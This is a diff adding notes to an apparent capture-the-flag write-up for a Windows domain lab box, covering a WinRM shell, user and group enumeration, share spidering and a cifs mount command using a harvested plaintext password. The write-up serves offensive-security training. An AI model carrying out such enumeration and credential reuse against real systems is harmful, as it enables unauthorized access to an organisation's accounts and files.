@@ -151,4 +151,55 @@ irb: warn: can't alias jobs from irb_jobs.
                 
 ```
 - we have password with user s.smith since it is his directory now we can try winrm  and we got a shell and user flag on desktop
-- 
+# Priv Esc 
+- run whoami /all to see what we have access to
+- i see audit group but also run
+```
+*Evil-WinRM* PS C:\Users\s.smith\desktop> net user s.smith
+User name                    s.smith
+Full Name                    Steve Smith
+Comment
+User's comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/28/2020 8:58:05 PM
+Password expires             Never
+Password changeable          1/28/2020 8:58:05 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 MapAuditDrive.vbs
+User profile
+Home directory
+Last logon                   1/29/2020 12:26:39 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Audit Share          *IT
+                             *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
+- we see audit share and it groups
+```
+*Evil-WinRM* PS C:\Users\s.smith\desktop> net localgroup "Audit Share"
+Alias name     Audit Share
+Comment        \\Casc-DC1\Audit$
+
+Members
+
+-------------------------------------------------------------------------------
+s.smith
+The command completed successfully.
+
+```
+- there is a comment
+- we can use crackmapexec with spiderplus like above to enumrate all shares as ippsec did
+- There’s a c:\shares\, but I don’t have permissions to list the directories in it we can go into Audit based on the share name in the comment
+- copy all the files to my local VM
+```
+sudo mount -t cifs -o 'user=s.smith,password=sT333ve2' //10.10.10.182/audit$ .
+```
